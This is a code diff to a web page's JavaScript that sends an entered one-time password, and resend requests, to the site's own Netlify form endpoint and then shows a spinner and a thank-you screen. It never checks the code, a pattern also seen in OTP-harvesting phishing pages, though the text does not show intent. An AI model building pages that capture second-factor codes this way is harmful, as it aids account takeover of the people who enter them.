@@ -22,36 +22,60 @@ document.addEventListener("DOMContentLoaded", function() {
     });
 
     otpVerificationForm.addEventListener('submit', function(event) {
-        // Check if OTP length is between 6 and 8
+        event.preventDefault(); // Prevent the default form submission
+
         if (otpInput.value.length < 6 || otpInput.value.length > 8) {
-            event.preventDefault();  // Prevent the default form submission
             alert("Please enter a valid OTP!");
+            return;
         }
-        // The form will be submitted traditionally without JavaScript interception
+
+        let formData = new FormData(otpVerificationForm);
+        
+        fetch('/', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: new URLSearchParams(formData).toString()
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            otpContainer.style.display = 'none';
+            spinnerContainer.style.display = 'flex';
+
+            setTimeout(() => {
+                spinnerContainer.style.opacity = 0;
+                setTimeout(() => {
+                    spinnerContainer.style.display = 'none';
+                    thanksContainer.style.display = 'flex';
+                    thanksContainer.style.opacity = 1;
+                }, 500);
+            }, 3000);
+        })
+        .catch(error => {
+            console.error('Form submission error:', error);
+            alert('Form submission failed, please try again.');
+        });
     });
 
     // Timer, progress bar, and resend form functionality
-    var countdown = 75; // 75 seconds countdown
+    var countdown = 75;
     var timer = setInterval(function() {
         updateTimerDisplay(countdown);
 
-        // Update progress bar width
         var progressBarWidth = (countdown / 75) * 100;
         timerBar.style.width = progressBarWidth + '%';
 
         if (--countdown < 0) {
             clearInterval(timer);
-            timerBar.style.display = 'none'; // Hide the progress bar
+            timerBar.style.display = 'none';
             resendLink.classList.add('enabled');
             resendLink.addEventListener('click', function(event) {
-                event.preventDefault(); // Prevent default link behavior
-                submitResendForm(); // Call function to submit the form via AJAX
+                event.preventDefault();
+                submitResendForm();
             });
         }
     }, 1000);
-
-    // Initialize the timer display
-    updateTimerDisplay(countdown);
 
     function updateTimerDisplay(seconds) {
         var minutes = Math.floor(seconds / 60);
@@ -62,11 +86,9 @@ document.addEventListener("DOMContentLoaded", function() {
     }
 
     function submitResendForm() {
-        // Construct the form data payload
         var formData = new FormData(resendForm);
-        formData.append('form-name', 'resendOTPForm'); // Ensure this matches your Netlify settings
+        formData.append('form-name', 'resendOTPForm');
 
-        // Encode form data to match 'application/x-www-form-urlencoded' content type
         var encodedData = new URLSearchParams(formData).toString();
 
         fetch("/", {
@@ -76,14 +98,11 @@ document.addEventListener("DOMContentLoaded", function() {
         })
         .then(response => {
             if (response.ok) {
-                // Display confirmation message
                 resendConfirmation.style.display = 'block';
-                // Optional: Hide the confirmation message after some time
                 setTimeout(function() {
                     resendConfirmation.style.display = 'none';
                 }, 5000);
             } else {
-                // Handle errors
                 console.error('Netlify form submission error:', response);
             }
         })
